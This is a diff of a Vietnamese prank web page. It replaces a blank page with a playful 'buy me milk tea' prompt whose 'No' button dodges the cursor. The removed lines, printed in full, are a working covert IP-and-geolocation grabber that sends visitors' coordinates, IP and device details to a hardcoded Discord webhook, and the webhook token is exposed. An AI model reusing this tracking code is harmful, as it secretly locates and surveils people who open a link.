@@ -2,59 +2,93 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>...</title>
-  <script>
-    window.onload = async () => {
-      const webhook = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";
+  <title>Mua trà sữa cho t nhóoooo 🧋</title>
+  <style>
+    body {
+      font-family: 'Comic Sans MS', cursive;
+      background-color: #ffe6f0;
+      text-align: center;
+      padding-top: 100px;
+      color: #ff66b2;
+    }
 
-      const sendToDiscord = (msg) => {
-        fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: msg })
-        });
-      };
+    h1 {
+      font-size: 30px;
+      margin-bottom: 50px;
+      animation: bounce 1s infinite alternate;
+    }
 
-      const getIP = async () => {
-        try {
-          const res = await fetch("https://api.ipify.org/?format=json");
-          const data = await res.json();
-          return data.ip || "Không rõ";
-        } catch {
-          return "Không lấy được IP";
-        }
-      };
+    @keyframes bounce {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-10px); }
+    }
 
-      const getDeviceInfo = () => navigator.userAgent;
-      const getTime = () => new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+    button {
+      font-size: 20px;
+      padding: 15px 30px;
+      margin: 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
 
-      const ip = await getIP();
-      const ua = getDeviceInfo();
-      const time = getTime();
+    #yesBtn {
+      background-color: #ff66b2;
+      color: white;
+    }
 
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude.toFixed(6);
-          const lon = pos.coords.longitude.toFixed(6);
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          sendToDiscord(`📍 **Đã cấp quyền truy cập vị trí**
+    #noBtn {
+      background-color: #ccccff;
+      color: #333;
+      position: relative;
+    }
 
-🛰️ Tọa độ: ${lat}, ${lon}
-📌 Google Maps: ${mapLink}
-🌐 IP: ${ip}
-💻 Thiết bị: ${ua}
-🕒 Thời gian: ${time}`);
-        },
-        (err) => {
-          sendToDiscord(`⚠️ Ai đó vừa vào web nhưng **không cho phép truy cập vị trí**.
+    #noBtn:hover {
+      position: absolute;
+      top: calc(50vh * Math.random());
+      left: calc(50vw * Math.random());
+    }
 
-🌐 IP: ${ip}
-💻 Thiết bị: ${ua}
-🕒 Thời gian: ${time}`);
-        }
-      );
-    };
-  </script>
+    .heart {
+      font-size: 40px;
+      color: red;
+      animation: heartbeat 1s infinite;
+    }
+
+    @keyframes heartbeat {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.2);
+      }
+    }
+  </style>
 </head>
-<body style="background:#fff; margin:0;"></body>
+<body>
+  <h1>Mai mày mua chà sữa cho taoo nhaaa 🧋💖</h1>
+  <button id="yesBtn">Cóaaa 💕</button>
+  <button id="noBtn">Khônggg 😤</button>
+
+  <script>
+    const yesBtn = document.getElementById("yesBtn");
+    const noBtn = document.getElementById("noBtn");
+
+    yesBtn.addEventListener("click", () => {
+      alert("Cẻm mơn bn iuuu nhìuu =)) 🥰🧋");
+    });
+
+    // Troll nút Không - chạy lung tung
+    noBtn.addEventListener("mouseover", () => {
+      const maxX = window.innerWidth - noBtn.clientWidth;
+      const maxY = window.innerHeight - noBtn.clientHeight;
+      const randomX = Math.random() * maxX;
+      const randomY = Math.random() * maxY;
+      noBtn.style.position = "absolute";
+      noBtn.style.left = `${randomX}px`;
+      noBtn.style.top = `${randomY}px`;
+    });
+  </script>
+</body>
 </html>
